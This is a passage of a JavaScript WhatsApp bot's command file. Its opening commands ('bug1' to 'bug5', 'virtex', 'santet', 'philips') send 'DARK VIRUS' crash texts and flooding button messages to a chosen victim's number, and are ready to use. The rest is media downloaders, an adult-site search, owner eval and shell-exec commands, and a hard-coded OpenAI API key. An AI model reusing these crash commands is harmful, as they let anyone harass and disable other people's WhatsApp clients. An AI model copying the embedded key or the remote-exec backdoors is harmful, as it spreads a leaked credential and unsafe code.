        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('Itu Nomor Lu Sendiri')
        await sleep(3000)
        conn.sendMessage(num, {
          text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️',
          templateButtons: [
            { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
            { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
            { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
            { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
            { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
            { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
            { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
            { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
            { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
          ]
        })
        await sleep(3000)
        mentions(`Sukses kirim ${command} to @${num.split('@')[0]}`, [num])
      }
        break
      case 'santetpc':
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Contoh ${command} 6281297970769`)
        let tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
        if (tosend == ownerNumber) return reply('Tidak Bisa, Karena Itu Nomer Developer')
        let kgdhwus = await conn.onWhatsApp(tosend)
        if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
        var jumlah = '4'
        for (let i = 0; i < jumlah; i++) {
          conn.sendMessage(tosend, {
            text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️',
            templateButtons: [
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://wa.me/` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://wa.me/` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://wa.me/` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://wa.me/` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
            ]
          })
          await sleep(1000)
        }
        reply(`Sukses`)
        break
      case 'philips2':
      case 'bug2': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('Itu Nomor Lu Sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
        await sleep(1000)
        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
        await sleep(1000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'philips3': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('Itu Nomor Lu Sendiri')
        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
        await sleep(3000)
        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
        await sleep(3000)
        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'santet': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!isGroup) return reply(mess.OnlyGrup)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else {
          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
        }
      }
        break
      case 'santet2': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!isGroup) return reply(mess.OnlyGrup)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else {
          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
        }
      }
        break
      case 'santet3': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!isGroup) return reply(mess.OnlyGrup)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else {
          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
        }
      }
        break
      case 'virtex': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'virtex2': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'virtex3': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug1': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug2': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug3': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug4': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug5': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '628889616144@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
     /* case 'tiktokdl': case 'ttdl': case 'tiktok': {
        if (!q) return reply('contoh :\n#tiktokdl https://vt.tiktok.com/ZSRG695C8/')
        reply(mess.wait)
        try {
          var ttdl_res = await fetchJson(`https://rest-api-bwb9.onrender.com/api/dowloader/tikok?url=${q}&apikey=86541bad`)
          if (ttdl_res.status == false) return reply(`Url timdak valid cok.`)
          var tiktod = ttdl_res.result
          let tdl = `
    ┍────────────◉
    ︱⊦⊸ Author : GuraBot - MD
    ︱⊦⊸ Username : ${tiktod.username}
    ︱⊦⊸ Deskripsi : ${tiktod.description}
    ┕─────◉
  `
          let btn_ttdl = [
            { buttonId: `${prefix}ttmp3 ${q}`, buttonText: { displayText: '⋮☰ AUDIO' }, type: 1 },
            { buttonId: `${prefix}ttmp4 ${q}`, buttonText: { displayText: '⋮☰ NO WM' }, type: 1 }
          ]
          var but_ttdl = {
            image: { url: tiktod.pp },
            caption: '                       ❒ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 ❒',
            footer: tdl,
            buttons: btn_ttdl,
            mentions: [sender],
            headerType: 4
          }
          conn.sendMessage(from, but_ttdl, { quoted: msg })
        } catch (err) {
          reply('Terjadi Kesalahan!!\nUrl tidak valid')
        }
      }*/
        break
      case 'tt':
      case 'ttdl':
      case 'tiktok':
      case 'ttmp4':
      case 'tiktokmp4': {
        if (!q) return reply(`Example : ${prefix + command} https://www.tiktok.com/@echaammq/video/7204778953771339034`)
        if (!q.includes('tiktok.com')) return reply(`Link Invalid!!`)
        reply(mess.wait)
        var btn_ttmp3 = [
          { buttonId: `!ttmp3 ${q}`, buttonText: { displayText: '⋮☰ 𝐌𝐏𝟑' }, type: 1 },
        ]
let tt_dl = await fetchJson(`https://api.akuari.my.id/downloader/tiktok3?link=${q}`)
 if (tt_dl.message) return reply(tt_dl.message)
var dl_tt = tt_dl.hasil
let tt_cap = ` Tiktok - Downloader 

Username: ${dl_tt.username}
Like: ${dl_tt.like}
Comment: ${dl_tt.comment}
Share: ${dl_tt.share}
Views: ${dl_tt.views}
`
        conn.sendMessage(from, { caption: tt_cap, video: { url: dl_tt.download_mp4_hd }, buttons: btn_ttmp3, footer: '© Gurabot - MD' })
      }
        break
      case 'ttmp3':
      case 'tiktokmp3':
        if (!q) return reply('Mana url nya')
        let titik = await fetchJson(`https://api.akuari.my.id/downloader/tiktok3?link=${q}`)
        if (titik.message) return reply(titik.message)
var dl_tit = titik.hasil
          conn.sendMessage(from, { audio: { url: dl_tit.download_mp3 }, mimetype: 'audio/mp4', fileName: dl_tit.music_title + '.mp3' }, { quoted: msg })
        break
      case 'ig': {
        if (!q) return reply(`Link nya mana?\n*contoh:*\n${prefix + command} https://www.instagram.com/reel/CSa7MWrlgri/`)
        if (!q.includes('instagram')) return reply(`Link timdack valid.`)
        reply(mess.wait)
        const instagramGetUrl = require("instagram-url-direct")
        const results = await instagramGetUrl(q)
        console.log(results)
        try {
          for (let igdl of results.url_list) {
            if (igdl.includes('.mp4')) {
              conn.sendMessage(from, { video: { url: igdl }, caption: `Done !`, mimetype: 'video/mp4' }, { quoted: msg })
            } else {
              conn.sendMessage(from, { image: { url: igdl }, caption: `Done !` }, { quoted: msg })
            }
          }
        } catch (err) {
          reply(`Link download timdack ditemukan.`)
        };
      }
        break
      /*case 'igstory': case 'igs':
        if (!q) return reply(`url story nya? Contoh :\n${prefix + command} https://www.instagram.com/stories/btr_citraaa/2989344688605937050/`)
        if (!q.includes('instagram')) return reply(`Link timdack valid.`)
        var igs = await fetchJson(`https://api.xteam.xyz/dl/igs?url=${q}&APIKEY=apikeyaine`)
        if (igs.code == 400) return reply(`url story timdack valid.`)
        try {
          for (let i of igs.result) {
            console.log(igs)
            if (i.url.includes('mp4')) {
              conn.sendMessage(from, { video: { url: i.url }, caption: `Type : ${i.type}`, mimetype: 'video/mp4' }, { quoted: msg })
            } else {
              conn.sendMessage(from, { image: { url: i.url }, caption: `Type : ${i.type}` }, { quoted: msg })
            }
          }
        } catch (err) {
          reply(`Story timdack ditemukan.`)
        };
        break*/
      case 'fbdownload': case 'fb':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example:\n${prefix + command} https://www.facebook.com/botikaonline/videos/837084093818982`)
        if (q.includes('reel')) return reply(`Tidak support download fb-reel`)
        try {
        var bochil = await fetchJson(`https://api.ibeng.tech/api/download/fb?url=${q}&apikey=tamvan`)
        var fbd = bochil.result
        console.log(fbd)
        if (bochil.status !== true) return reply(`Link download tidak tersedia, mungkin link error/tidak valid.`)
        conn.sendMessage(from, { text: `Wait . . .` }, { quoted: msg })
        //const boug1 = await getBuffer(fbd.download[0].url)
        conn.sendMessage(from, { video: { url: fbd.hd }, caption: `*Done !*\n` }, { quoted: msg })
        } catch(e) {
        reply(`Error masbroo...`)
        console.log(e)
        }
        break
     /* case 'twitter': case 'twit': case 'twitt': {
        if (!q) return reply(`Example : ${prefix + command} link`)
        if (!q.includes('twitter')) return reply(`Link Invalid!!`)
        reply(mess.wait)
        let anunya = await xfar.downloader.twitter(q)
        conn.sendMessage(from, { video: { url: anunya.quality_720 }, caption: anunya.caption }, { quoted: msg })
      }
        break */
      case 'ytdl':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply('*Contoh:*\n#ytdl https://youtu.be/watyplEMt90')
        reply(mess.wait)
        var yytt = await fetchJson(`https://rest-api-bwb9.onrender.com/api/dowloader/yt?url=${q}&apikey=86541bad`)
        if (yytt.status == false) return reply('Url yang anda masukan tidak valid!')
        console.log(yytt.result)
        var txt_ytdl = `*YT - DOWNLOADER*

*Author:* GuraBot - MD
*Title:* ${yytt.result.title}
*Viewers:* ${yytt.result.view}
*Published:* ${yytt.result.uploadDate}
*Channel:* ${yytt.result.channel}
*Source:* ${q}
`
        var marek = '0@s.whatsapp.net'
        let btn_ytdl = [
          { buttonId: `${prefix}ytmp3 ${q}`, buttonText: { displayText: '⋮☰ AUDIO' }, type: 1 },
          { buttonId: `${prefix}ytmp4 ${q}`, buttonText: { displayText: '⋮☰ VIDEO' }, type: 1 }
        ]
        var but_menu = {
          image: { url: yytt.result.thum },
          caption: txt_ytdl,
          footer: 'Klik tombol dibawah untuk mendownload media',
          buttons: btn_ytdl,
          mentions: [sender, marek],
          headerType: 2
        }
        conn.sendMessage(from, but_menu, { quoted: msg })
        break
      case 'ytsearch':
      case 'yts':
        if (!q) return reply(`Contoh:\n${prefix + command} bukti Virgoun`)
        let list_rows = [];
        const data = await yts(q);
        for (let a of data.all) {
          list_rows.push({
            title: a.title, description: `Published: ${a.ago}\nDurasi: ${a.duration} | Views: ${a.views} |`, rowId: `.ytmp4 ${a.url}`
          })
        }
        const buttonNya = {
          text: `Hasil Pencarian Youtube Dengan Kata Kunci: \n_${q}_`,
          footer: '© GuraBot - MD',
          buttonText: 'Touch Me (≧▽≦)',
          sections: [{
            title: "Hasil Pencarian",
            rows: list_rows
          }],
          listType: 1
        }
        conn.sendMessage(from, buttonNya)
        break
      case 'ai':
      case 'openai':
      case 'guraa':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu rest api`)
        reply(mess.wait)
        try {
          var configuration = new Configuration({
            apiKey: "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",
          });
          let openai = new OpenAIApi(configuration);
          let response = await openai.createCompletion({
            model: "text-davinci-003",
            prompt: q,
            temperature: 0.3,
            max_tokens: 2000,
            top_p: 1.0,
            frequency_penalty: 0.0,
            presence_penalty: 0.0,
          });
          conn.sendMessage(from, { text: `* A I \n\n*${response.data.choices[0].text}\n\n- ${botName}\n` }, { quoted: ftroli })
        } catch (err) {
          console.log(err)
          reply('Maaf, bot tidak mengerti')
        }
        break
      case 'dall-e':
      case 'dalle':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Mencari gambar/foto dari Ai.\n\nContoh:\n${prefix}${command} gunung Bromo `)
        try {
          let configuration = new Configuration({
            apiKey: "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",
          });
          let openai = new OpenAIApi(configuration);
          let response = await openai.createImage({
            prompt: q,
            n: 5,
            size: "512x512",
          });
          console.log(response.data.data)
          let dalle = response.data.data
          let dallnya = dalle[Math.floor(Math.random() * dalle.length)]
          console.log(dallnya.url)
          conn.sendImage(from, dallnya.url, `Nich Kack\n*_${q}_*`, ftroli)
        } catch (e) {
          reply(`Sepertinya gambar/foto yang kamu cari tidak ditemukan oleh AI`)
        }
        break
      case 'toanime':
      case 'jadianime':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        if (!isImage && !isQuotedImage) return reply('Kirim/reply foto yang ingin dijadikan anime')
        const path = require('path');
        var medianime = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
        reply(mess.wait)
        let buffer_anime = fs.readFileSync(medianime)
        var anime2 = 'sticker/' + getRandom('.png')
        fs.writeFileSync(`./${anime2}`, buffer_anime)
        var { url } = await UploadFileUgu(anime2)
        try {
        let imageani = `https://api.lolhuman.xyz/api/imagetoanime?apikey=AryaXyz&img=${url}`
          //console.log(image)
          //if (image.code != 200) return reply('Foto gagal di convert')
          conn.sendMessage(from, { image: { url: imageani }, caption: 'Nich dah jadi anime kack:v' }, { quoted: msg })
        } catch (e) {
          console.log(e)
          reply('Emror kack')
        }
        fs.unlinkSync(anime2)
        fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpg`)
        break
    case 'rmbg':
    case 'removebg':
    case 'remove.bg':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!isImage && !isQuotedImage) return reply(`Kirim/reply foto yang ingin di removebg nya dengan caption ${prefix + command}`)
        var rmb_ny = await conn.downloadAndSaveMediaMessage(msg, 'image', './sticker/rmbg.jpg')
        reply(mess.wait)
        let buff_rm = fs.readFileSync(rmb_ny)
        var rmb = 'sticker/' + getRandom('.png')
        fs.writeFileSync(`./${rmb}`, buff_rm)
        var { url } = await UploadFileUgu(rmb)
        let img_rmbg = `https://api.ibeng.tech/api/maker/rmbg?url=${url}&apikey=tamvan`
        conn.sendMessage(from, { image: { url: img_rmbg }, caption: 'Done' }, {quoted:msg})
        break
        case 'xnxx':
        case 'xnxxsearch':
        case 'xnxxsearching':
            if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
            if (cekUser("premium", sender) == null) return reply(mess.OnlyPrem)
            if (!q) return reply(`*Example:\n${prefix + command} step sister`)
            try {
            let xnx = await fetchJson(`https://api.itsrose.site/dewasa/xnxx/search?query=${q}&apikey=itsroseUnlimitedLimit`)
            if (xnx.status != true) return reply(`Mungkin query yang anda cari tidak ditemukan.`)
            let xxx = `Hasil dari pencarian Xnxx-Search: ${q}\n\n`
            for (let xn of xnx.result) {
xxx += `
⊦⊸ *Title:* ${xn.title}
⊦⊸ *Views:* ${xn.views}
⊦⊸ *Quality:* ${xn.quality}
⊦⊸ *Duration:* ${xn.duration}
⊦⊸ *Url:* ${xn.url}\n`
xxx += '\n' + '•••••••••••••••••••••••••••••••••' + '\n'
            }
            conn.sendMessage(from, { text: xxx }, {quoted:msg})
        } catch(e) {
            console.log(e)
            reply(`Error geiss..`)
        }
        break
        case 'xnxxdl':
        case 'xnxxdown':
        case 'xnxxdownload':
            if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
            if (cekUser("premium", sender) == null) return reply(mess.OnlyPrem)
            if (!q) return reply(`*Example:\n${prefix + command} https://www.xnxx.com/video-wvmwp36/knocking_my_step_sister_up`)
            try {
                let xnxdl = await fetchJson(`https://api.itsrose.site/dewasa/xnxx/detail?url=${q}&apikey=itsroseUnlimitedLimit`)
                if (xnxdl.status != true) return reply(`Link tidak valid cuy.`)
                let xnxres = xnxdl.result
let xxxdl = `
⊦⊸ *Title:* ${xnxres.title}
⊦⊸ *Duration:* ${xnxres.duration}
⊦⊸ *Quality:* ${xnxres.quality}
⊦⊸ *Views:* ${xnxres.views}
⊦⊸ *Rating:* ${xnxres.rating}
⊦⊸ *Like:* ${xnxres.like}
⊦⊸ *Dislike:* ${xnxres.dislike}
⊦⊸ *Download:* 

  - Low:  ${xnxres.download.low}
  - High: ${xnxres.download.high}


_Download sendiri jangan manja_`
                conn.sendMessage(from, { text: xxxdl }, {quoted:msg})
            } catch(e) {
                console.log(e)
                reply(`Waduh error masbro..`)
            }
            break
        
        case '>':
          if (!isOwner) return reply(mess.OnlyOwner);
          var err = new TypeError;
          err.name = "EvalError "
          err.message = "Code Not Found (404)"
          if (!q) return reply(util.format(err))
          var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
          try {
          var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
          reply(txtes)
          } catch(e) {
          let _syntax = ""
          let _err = util.format(e)
          let err = syntaxerror(arg, "EvalError", {
          allowReturnOutsideFunction: true,
          allowAwaitOutsideFunction: true,
          sourceType: "commonjs"
          })
          if (err) _syntax = err + "\n\n"
          reply(util.format(_syntax + _err))
          }
          break
      default:

        /*━━━━━━━[ Function Menfess ]━━━━━━━*/

        // Function Menfess Auto Bales
        // Jangan Lu Edit Lagi Disini
        // Buy No enc? Chat Wa
        // Wa Guwe : 083834558105

        var _0x1a6220 = _0x4a33; (function(_0x5b325d, _0xd37330) { var _0x15f0df = _0x4a33, _0x17b9a4 = _0x5b325d(); while (!![]) { try { var _0x5034a9 = parseInt(_0x15f0df(0x1d3)) / 0x1 * (-parseInt(_0x15f0df(0x1ca)) / 0x2) + -parseInt(_0x15f0df(0x1d4)) / 0x3 * (parseInt(_0x15f0df(0x1c5)) / 0x4) + parseInt(_0x15f0df(0x1c7)) / 0x5 * (-parseInt(_0x15f0df(0x1cf)) / 0x6) + -parseInt(_0x15f0df(0x1d5)) / 0x7 * (parseInt(_0x15f0df(0x1c9)) / 0x8) + -parseInt(_0x15f0df(0x1cc)) / 0x9 + -parseInt(_0x15f0df(0x1c4)) / 0xa + parseInt(_0x15f0df(0x1cd)) / 0xb; if (_0x5034a9 === _0xd37330) break; else _0x17b9a4['push'](_0x17b9a4['shift']()); } catch (_0x1d82f8) { _0x17b9a4['push'](_0x17b9a4['shift']()); } } }(_0x351e, 0x54a56)); function _0x4a33(_0x1e5c04, _0x200f07) { var _0x351e1e = _0x351e(); return _0x4a33 = function(_0x4a33ba, _0x1cdc80) { _0x4a33ba = _0x4a33ba - 0x1c3; var _0x110a2e = _0x351e1e[_0x4a33ba]; return _0x110a2e; }, _0x4a33(_0x1e5c04, _0x200f07); } function _0x351e() { var _0x26a0e1 = ['pesan\x20diteruskan', '1103568ZGfugO', 'sendMessage', 'message', 'text', '445736reezra', '18tskWyb', '1168237exHeIM', 'messages', '4186710kRyETk', '297452lFwhFR', 'type', '10QPbKSn', 'teman', '16yYTSyk', '2wHOPdZ', 'conversation', '2985354kCXAlP', '29597029dyJWde']; _0x351e = function() { return _0x26a0e1; }; return _0x351e(); } if (!isCmd) { if (cekPesan('id', sender) == null) return; if (cekPesan(_0x1a6220(0x1c8), sender) == ![]) return; if (m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1c6)] == _0x1a6220(0x1cb) || m[_0x1a6220(0x1c3)][0x0]['type'] == 'extendedTextMessage') { try { var chat_anonymous = m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)]['extendedTextMessage'][_0x1a6220(0x1d2)]; } catch (_0x2d0d82) { var chat_anonymous = m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)][_0x1a6220(0x1cb)]; } let text_nya_menfes = '*ANONYMOUS\x20CHAT*\x0a💬\x20:\x20' + chat_anonymous; conn[_0x1a6220(0x1d0)](cekPesan(_0x1a6220(0x1c8), sender), { 'text': text_nya_menfes }), conn['sendMessage'](from, { 'text': _0x1a6220(0x1ce) }, { 'quoted': msg }); } }

      // Bang yg ini knp di enc?
      // Gua belike : kamu nanya:v

      // Kan di thumbnail no enc 100%?
      // Gua belike : function nya langka bro

      /*━━━━━━━━━━━━━━━━━━━━━━━━━━━━*/

      // AUTHOR : LEXXY OFFICIAL
      // INI CONSOLE LOG JNGN EDIT
      // exec by ekuzika
    } 
    if (chats.startsWith('=>')) {
      if (!isOwner) return reply(mess.OnlyOwner)
      function Return(sul) {
      sat = JSON.stringify(sul, null, 2)
      bang = util.format(sat)
      if (sat == undefined) {
      bang = util.format(sul)
      }
      return reply(bang)
      }
      try {
      reply(util.format(eval(`(async () => { ${chats.slice(3)} })()`)))
      } catch (e) {
      reply(String(e))
      }
      }
  if (chats.startsWith('$')){
      if (!isOwner) return reply(mess.OnlyOwner)
      let qur = chats.slice(2)
      exec(qur, (err, stdout) => {
      if (err) return reply(`${err}`)
      if (stdout) {
